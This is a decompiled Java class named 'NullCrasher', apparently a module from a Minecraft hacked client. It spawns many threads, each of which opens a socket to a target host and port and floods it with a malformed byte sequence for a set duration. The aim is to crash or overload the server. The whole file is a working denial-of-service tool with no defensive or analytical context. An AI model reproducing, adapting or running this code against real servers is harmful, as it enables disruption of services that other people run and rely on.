/*
 * Decompiled with CFR 0.152.
 */
package de.fanta.module.impl.miscellaneous;

import java.io.DataOutputStream;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class NullCrasher {
    public static int threads = 0;

    public static void pingThreadCrasher(final String host, final int port, int maxThreads, long time) {
        time = TimeUnit.SECONDS.toMillis(time);
        long time1 = System.currentTimeMillis();
        do {
            if (threads < maxThreads) {
                new Thread(){

                    @Override
                    public void run() {
                        ++threads;
                        try {
                            NullCrasher.ping(host, port);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                        --threads;
                    }
                }.start();
            }
            try {
                Thread.sleep(1L);
            }
            catch (InterruptedException interruptedException) {
                // empty catch block
            }
        } while (System.currentTimeMillis() - time1 < time);
    }

    public static void ping(String host, int port) throws Exception {
        Socket socket = new Socket(host, port);
        DataOutputStream out = new DataOutputStream(socket.getOutputStream());
        out.write(-71);
        int i = 0;
        while (i < 500) {
            out.write(1);
            out.write(0);
            ++i;
        }
    }
}

